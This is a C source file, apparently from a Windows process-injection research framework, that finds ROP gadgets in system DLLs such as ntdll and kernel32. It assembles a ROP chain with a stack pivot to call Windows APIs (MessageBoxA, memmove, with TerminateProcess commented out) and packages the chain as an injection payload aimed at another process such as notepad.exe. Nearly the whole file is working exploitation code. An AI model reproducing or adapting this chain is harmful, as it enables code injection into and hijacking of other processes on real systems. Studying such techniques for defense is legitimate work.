#define _CRT_SECURE_NO_WARNINGS

// Standard Include's
#include "Procs_and_Threads.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <psapi.h>
#include <assert.h>

#define check_Gadget(gadget, name) if (gadget == NULL) printf("\n[+] %s gadget returned null\n\n", name);
#define DONT_CARE 0
#define	PROCESS_TERMINATE 1
#define FALSE 0

// Local Includes

#include "Rop_Chain.h"
#include "memmem.h"

// Global Variables
DWORD64 GADGET_loop, GADGET_popregs, GADGET_ret, GADGET_pivot, GADGET_addrsp, GADGET_poprax, GADGET_poprdx, GADGET_poprcx, GADGET_popr8, GADGET_movr8deax, GADGET_movsxd, GADGET_xchgeaxecx, GADGET_xorraxrax;
DWORD64* ROP_chain;
int rop_pos;
DWORD64 saved_return_address;
TStrDWORD64Map *run_params;

// Functions
typedef struct {
	DWORD64 address;
	size_t size;
}TEXT_SECTION_INFO;

void insertToRop(DWORD64* chain, int *pos, DWORD64 value)
{
	chain[*pos] = value;
	(*pos)++;
}

void SetRcx(DWORD64 value)
{
	ROP_chain[rop_pos++] = GADGET_poprcx;
	ROP_chain[rop_pos++] = value;
}

void SetRdx(DWORD64 value)
{
	ROP_chain[rop_pos++] = GADGET_poprdx;
	ROP_chain[rop_pos++] = value;
}

void SetR8(DWORD64 value)
{
	if (GADGET_popr8)
	{
		ROP_chain[rop_pos++] = GADGET_popr8;
		ROP_chain[rop_pos++] = value;
	}
	else
	{
		ROP_chain[rop_pos++] = GADGET_poprax;
		ROP_chain[rop_pos++] = value;
		ROP_chain[rop_pos++] = GADGET_movr8deax;
	}
}

void SetR9(DWORD64 value)
{
	ROP_chain[rop_pos++] = GADGET_poprax;
	ROP_chain[rop_pos++] = value;
	ROP_chain[rop_pos++] = GADGET_movsxd;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
}

void SetApi(DWORD64 winapi)
{
	ROP_chain[rop_pos++] = winapi;
	ROP_chain[rop_pos++] = GADGET_addrsp;
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // shadow space
	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
}

void MovRetToRcx()
{
	ROP_chain[rop_pos++] = GADGET_xchgeaxecx;
}

void FunctionCall(DWORD64 api_func ,DWORD64 rcx, DWORD64 rdx, DWORD64 r8, DWORD64 r9)
{
	SetRcx(rcx);
	SetRdx(rdx);
	SetR8(r8);
	SetR9(r9);
	SetApi(api_func);
}

TEXT_SECTION_INFO GetTextSection(HMODULE mod)
{
	// Parse a module in order to retrieve its text section

	TEXT_SECTION_INFO section_info = { 0 };
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)mod;
	PIMAGE_NT_HEADERS NtHeader;
	PIMAGE_OPTIONAL_HEADER OptionalHeader;
	PIMAGE_SECTION_HEADER SectionHeader;

	NtHeader = (PIMAGE_NT_HEADERS)((BYTE*)DosHeader + DosHeader->e_lfanew);
	OptionalHeader = (PIMAGE_OPTIONAL_HEADER)&NtHeader->OptionalHeader;
	SectionHeader = IMAGE_FIRST_SECTION(NtHeader);
	DWORD NumberOfSections = NtHeader->FileHeader.NumberOfSections;

	for (int i = 0; i < NumberOfSections; i++)
	{
		DWORD64 SecSize = SectionHeader->SizeOfRawData;
		if (SecSize != 0)
		{
			if (!memcmp(SectionHeader->Name, ".text", 5))
			{
				section_info.address = (DWORD64)((BYTE*)SectionHeader->VirtualAddress + (DWORD64)DosHeader);
				section_info.size = SectionHeader->SizeOfRawData;
				return section_info;
			}
			else
				SectionHeader++;
		}
		else
			SectionHeader++;
	}

	return section_info;
}

DWORD64 GadgetFinder(const void* const needle, const size_t needle_len)
{
	// Searches a given gadget in the text sections of shared libraries.
	// Text section is the only one which is executable.

	DWORD64 gadget;
	CHAR modules[6][11] = { "ntdll", "kernel32", "user32", "kernelbase", "gdi32", "gdiPlus" };

	for (int i = 0; i < 6; i++)
	{
		HMODULE hmod = GetModuleHandleA(modules[i]);
		if (hmod != NULL)
		{
			MODULEINFO modinfo;
			GetModuleInformation(GetCurrentProcess(), hmod, &modinfo, sizeof(modinfo));

			TEXT_SECTION_INFO textSection = GetTextSection(hmod);
			gadget = (DWORD64)memmem((BYTE*)textSection.address, textSection.size, needle, needle_len);
			if (gadget)
				return gadget;
		}
	}
	return 0;
}

DWORD FindGadgets()
{
	GADGET_loop = GadgetFinder("\xEB\xFE", 2); // jmp -2
	check_Gadget(GADGET_loop, "GADGET_loop");

	GADGET_popregs = GadgetFinder("\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);
	/*
	ntdll!LdrpHandleInvalidUserCallTarget+0x7f:
	00007ff8`5c63b3bf 58              pop     rax
	00007ff8`5c63b3c0 5a              pop     rdx
	00007ff8`5c63b3c1 59              pop     rcx
	00007ff8`5c63b3c2 4158            pop     r8
	00007ff8`5c63b3c4 4159            pop     r9
	00007ff8`5c63b3c6 415a            pop     r10
	00007ff8`5c63b3c8 415b            pop     r11
	00007ff8`5c63b3ca c3              ret
	*/

	GADGET_ret = GadgetFinder("\xC3", 1); // ret;
	check_Gadget(GADGET_ret, "GADGET_ret");

	GADGET_pivot = GadgetFinder("\x5C\xC3", 2); // pop rsp; ret
	check_Gadget(GADGET_pivot, "GADGET_pivot");

	GADGET_addrsp = GadgetFinder("\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
	check_Gadget(GADGET_addrsp, "GADGET_addrsp");

	GADGET_poprax = GadgetFinder("\x58\xC3", 2); // pop rax; ret;
	check_Gadget(GADGET_poprax, "GADGET_poprax");

	GADGET_poprdx = GadgetFinder("\x5A\xC3", 2); // pop rdx; ret;
	check_Gadget(GADGET_poprdx, "GADGET_poprdx");

	GADGET_poprcx = GadgetFinder("\x59\xC3", 2); // pop rcx; ret;
	check_Gadget(GADGET_poprcx, "GADGET_poprcx");

	GADGET_popr8 = GadgetFinder("\x41\x58\xC3", 3); // pop r8; ret;
	check_Gadget(GADGET_popr8, "GADGET_popr8");

	GADGET_movr8deax = GadgetFinder("\x44\x8B\xC0\x41\x8B\xC0\x48\x83\xC4\x28\xC3", 11); // mov r8d, eax; mov eax, r8d; add rsp, 0x28; ret;
	check_Gadget(GADGET_movr8deax, "GADGET_movr8deax");

	GADGET_movsxd = GadgetFinder("\x4C\x63\xC8\x49\x8B\xC1\x48\x83\xC4\x28\xC3", 11); // movsxd r9, eax; mov rax, r9; add rsp 0x28; ret
	check_Gadget(GADGET_movsxd, "GADGET_movsxd");

	//GADGET_movecxeax = GadgetFinder("\x8B\xC8\x48\x8B\xC1\x48\x83\xC4\x28\xC3", 10); // mov ecx, eax; mov rax, rcx; add rsp 0x28; ret;

	GADGET_xchgeaxecx = GadgetFinder("\x91\xC3", 2); // xchg eax, ecx; ret;
	check_Gadget(GADGET_xchgeaxecx, "GADGET_xchgeaxecx");

	GADGET_xorraxrax = GadgetFinder("\x48\x33\xC0\xC3", 4); // xor rax, rax; ret;
	check_Gadget(GADGET_xorraxrax, "GADGET_xorraxrax");

	// Return with error if one of gadgets wasn't found
	if (GADGET_loop == 0 || GADGET_ret == 0 || GADGET_pivot == 0 || GADGET_addrsp == 0 || GADGET_movr8deax == 0 || GADGET_poprax == 0\
		|| GADGET_poprdx == 0 || GADGET_poprcx == 0 || GADGET_popr8 == 0 || GADGET_movsxd == 0 || GADGET_xchgeaxecx == 0 || GADGET_xorraxrax == 0)
	{
		return 0;
	}

	return 1;
}

PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
{
	LoadLibrary(L"gdi32.dll");

	rop_pos = 0x0;
	run_params = &runtime_parameters;

	CHAR location[] = "psapi.dll";
	DWORD locSize = strlen(location);

	WCHAR terminateStr[] = L"notepad.exe";
	DWORD terminatePid = NameToPID((WCHAR*)terminateStr);
	PINJECTRA_PACKET* output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));

	HMODULE ntdll = GetModuleHandleA("ntdll");
	if (ntdll == NULL) return NULL;

	if (!FindGadgets()) return 0;

	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));

	OSVERSIONINFOEX os_Info;
	os_Info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionOs(&os_Info);

	
	if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // force stack alignment
		ROP_chain[rop_pos++] = GADGET_ret;
		
	FunctionCall((DWORD64)MessageBoxA, 0, 0, 0, 0);

	//// Get returned handle into ECX
	//MovRetToRcx();

	//SetApi((DWORD64)TerminateProcess);


	// STACK FIX
	SetRcx((*run_params)["orig_tos"]);

	ROP_chain[rop_pos++] = GADGET_poprdx;
	saved_return_address = rop_pos++; // rdx

	SetR8(8);
	SetR9(DONT_CARE);
	SetApi((DWORD64)GetProcAddress(ntdll, "memmove"));

	ROP_chain[rop_pos++] = GADGET_pivot;
	ROP_chain[rop_pos++] = (*run_params)["orig_tos"];

	// Write text to stack
	/*ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
	strcpy((char*)&ROP_chain[rop_pos], location);
	rop_pos += locSize;*/

	// Store new TOS
	ROP_chain[saved_return_address] = (*run_params)["tos"] + sizeof(DWORD64) * rop_pos;
	ROP_chain[rop_pos++] = DONT_CARE;

	for (int count=0; count < rop_pos; count++)
	{
		//Edit: Use printf("val = 0x%" PRIx64 "\n", val);
		printf("%d ---> 0x%llx\n", count, ROP_chain[count]);
	}
	// STACK FIX

	// Update Runtime Parameters with ROP-specific Parameters
	runtime_parameters["saved_return_address"] = saved_return_address;
	runtime_parameters["GADGET_pivot"] = GADGET_pivot;
	runtime_parameters["rop_pos"] = rop_pos;

	output->buffer = ROP_chain;
	output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
	output->metadata = &runtime_parameters;

	return output;
}
